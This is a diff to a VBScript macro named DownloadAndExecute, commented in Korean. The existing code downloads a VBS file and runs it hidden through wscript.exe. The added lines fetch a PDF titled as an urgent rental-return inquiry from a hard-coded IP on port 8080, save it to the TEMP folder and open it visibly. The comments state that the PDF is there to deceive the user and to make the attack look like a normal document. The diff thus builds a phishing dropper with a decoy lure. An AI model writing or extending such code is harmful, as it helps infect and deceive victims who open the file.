@@ -33,6 +33,7 @@ Sub DownloadAndExecute()
 
     Dim objShell, objHTTP, objStream, objFSO
     Dim url, savePath, targetDir
+    Dim pdfUrl, pdfPath, tempFolder
 
     Set objShell = CreateObject("WScript.Shell")
     Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP.6.0")
@@ -66,6 +67,30 @@ Sub DownloadAndExecute()
 
         ' VBS 실행
         objShell.Run "wscript.exe """ & savePath & """", 0, False
+    End If
+
+    ' 정상 PDF 다운로드 및 실행 (사용자 기만용)
+    pdfUrl = "http://192.168.202.44:8080/렌탈_반납이_안됩니다_-_긴급_문의.pdf"
+    tempFolder = objShell.ExpandEnvironmentStrings("%TEMP%")
+    pdfPath = tempFolder & "\렌탈_반납이_안됩니다_-_긴급_문의.pdf"
+
+    ' PDF 다운로드
+    Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+    objHTTP.Open "GET", pdfUrl, False
+    objHTTP.setRequestHeader "User-Agent", "Mozilla/5.0"
+    objHTTP.Send
+
+    If objHTTP.Status = 200 Then
+        ' PDF 파일로 저장
+        Set objStream = CreateObject("ADODB.Stream")
+        objStream.Type = 1  ' Binary
+        objStream.Open
+        objStream.Write objHTTP.responseBody
+        objStream.SaveToFile pdfPath, 2  ' Overwrite
+        objStream.Close
+
+        ' PDF 열기 (사용자에게 정상 문서로 보이게)
+        objShell.Run """" & pdfPath & """", 1, False
     End If
 
     Set objShell = Nothing
